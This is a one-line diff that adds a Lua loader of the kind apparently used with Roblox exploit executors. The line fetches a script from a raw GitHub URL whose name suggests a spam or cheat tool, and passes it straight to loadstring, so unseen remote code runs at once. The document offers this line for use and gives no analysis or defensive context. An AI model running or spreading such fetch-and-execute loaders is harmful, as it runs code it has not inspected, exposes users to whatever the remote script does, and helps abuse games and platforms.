@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandLobsterFill/loaders/main/loaders/interrogation-ai-spam2-py4tacvvii9upt.lua"))()
